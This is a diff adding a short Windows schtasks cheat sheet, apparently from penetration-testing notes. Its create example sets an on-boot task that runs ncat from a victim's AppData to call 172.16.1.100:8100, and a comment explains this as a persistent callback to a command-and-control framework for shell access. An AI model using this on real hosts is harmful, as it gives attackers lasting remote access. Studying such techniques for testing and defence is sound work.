@@ -1,1 +1,51 @@
+------------------------------------------------------------
+                      View task
+------------------------------------------------------------
+
+# view running tasks on host
+schtasks /Query /V /FO list
+
+
+------------------------------------------------------------
+                      Create task
+------------------------------------------------------------
+
+# create a new task
+# /create : to tell it what we are doing  
+# /sc : we must set a schedule
+# /tn : we must set the name
+# /tr : we must give it an action to take
+schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
+
+# A great example of a use for schtasks would be providing us with a callback every time the host boots up. This would ensure that if our shell dies, we will get a callback from the host the next time a reboot occurs, making it likely that we will only lose access to the host for a short time if something happens or the host is shut down. We can create or modify a new task by adding a new trigger and action. In our task above, we have schtasks execute Ncat locally, which we placed in the user's AppData directory, and connect to the host `172.16.1.100` on port `8100`. If successfully executed, this connection request should connect to our command and control framework (Metasploit, Empire, etc.) and give us shell access.
+
+------------------------------------------------------------
+                      Update task
+------------------------------------------------------------
+
+# change : Allows for modifying existing scheduled tasks
+# /tn :	designates the task to change
+#	/tr : modifies the program or action that the task runs.
+#	/ENABLE : change the state of the task to Enabled.
+# /DISABLE : change the state of the task to Disabled.
+schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
+
+------------------------------------------------------------
+                      Delete task
+------------------------------------------------------------
+
+# /delete : Remove a task from the schedule
+# /tn : Identifies the task to delete.
+# /s 	: Specifies the name or IP address to delete the task from.
+# /u 	: Specifies the user to run the task as.
+# /p 	: Specifies the password to run the task as.
+# /f 	: Stops the confirmation warning.
+schtasks /delete  /tn "My Secret Task" 
+
+# 
+
+
+
+
+
 
